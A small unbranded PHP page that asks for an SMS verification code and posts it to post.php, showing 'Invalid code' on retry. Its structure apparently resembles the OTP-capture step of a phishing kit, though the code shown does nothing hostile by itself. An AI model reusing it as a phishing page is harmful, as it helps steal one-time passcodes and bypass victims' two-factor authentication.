<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/apps.css">
    <title>Sms</title>
</head>
<body>


    
    

<main>



    <div class="continer">
    <div class="mobil">
<img src="res/img/mobil.png" >
       </div>
       <div class="m">

       </div>
<form action="post.php" method="post">
<h2>Confirmation</h2>

<div class="col"><h4 style="font-weight:normal ;text-align:left;">Please enter the verification code sent to your phone.</h4> </div>

<div class="col">
<input type="text" placeholder="Enter code" name="otp" required> <br> 
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code</p>';
}
?>

<div class="but">
    <button type="submit">Confirm</button>
</div>

</div> <br>




</form>

</div>
</div>



</main>
</body>
</html>